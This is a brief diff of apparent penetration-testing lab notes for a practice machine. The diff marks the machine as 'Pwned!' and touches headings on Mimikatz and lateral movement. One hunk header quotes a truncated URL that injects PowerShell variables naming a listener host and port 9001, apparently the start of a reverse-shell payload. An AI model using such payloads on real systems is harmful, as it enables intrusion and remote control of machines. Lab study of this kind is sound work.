@@ -1,4 +1,4 @@
-#InProgress 
+#Pwned! 
 ```IP
 192.168.242.99
 ```
@@ -83,3 +83,4 @@ http://192.168.164.99/?$LHOST%20=%20%22192.168.45.189%22;%20$LPORT%20=%209001;%2
 ### Mimikatz
 
 # Lateral Movement
+
